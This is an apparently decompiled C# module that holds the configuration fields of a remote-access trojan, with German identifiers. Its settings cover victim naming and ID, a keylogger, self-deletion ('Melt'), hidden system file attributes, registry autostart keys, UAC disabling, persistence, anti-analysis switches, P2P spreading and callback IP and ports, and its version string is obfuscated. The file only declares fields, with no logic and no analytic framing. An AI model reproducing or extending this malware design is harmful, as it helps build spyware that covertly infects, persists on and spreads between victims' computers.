using System.Collections.Generic;
using Microsoft.VisualBasic.CompilerServices;

namespace ns1;

[StandardModule]
internal sealed class Module2
{
	public struct VerbindungsInformationen
	{
		public string IpAdresse;

		public int ConnectPort;

		public int TransferPort;
	}

	public static List<VerbindungsInformationen> VerbindungsDaten = new List<VerbindungsInformationen>();

	public static bool AntiFunktionen = false;

	public static string IPAdresse;

	public static int Port;

	public static int TransferPort;

	public static string VictimName;

	public static bool OffKeylogger;

	public static int ReconnectTime;

	public static string Passwort;

	public static bool ErrorMessage;

	public static string ErrorMessageTitel;

	public static string ErrorMessageText;

	public static string ErrorMessageStyle;

	public static bool SystemProzessSetzen;

	public static string InstallationsOrdner;

	public static bool Melt;

	public static bool Attribut_Versteckt;

	public static bool Attribut_ReadOnly;

	public static bool Attribut_System;

	public static bool ServerInstallieren;

	public static string MutexString;

	public static bool Autostart_CurrentUser;

	public static bool Autostart_LocalMashine;

	public static bool Autostart_AxtivX;

	public static string AutostartKey_CurrentUser;

	public static string AutostartKey_LocalMashine;

	public static string AutostartKey_AxtivX;

	public static bool UAC_Deaktivieren;

	public static bool Persistenz;

	public static bool DDebug = false;

	public static bool Antis;

	public static bool P2PSpread;

	public static string VictimID;

	public static string ServerVersion = GClass0.smethod_0("5ĪȰ\u032cб");

	public static string _Ipadresse;

	public static int _ConnectionPort;

	public static int _TransferPort;
}
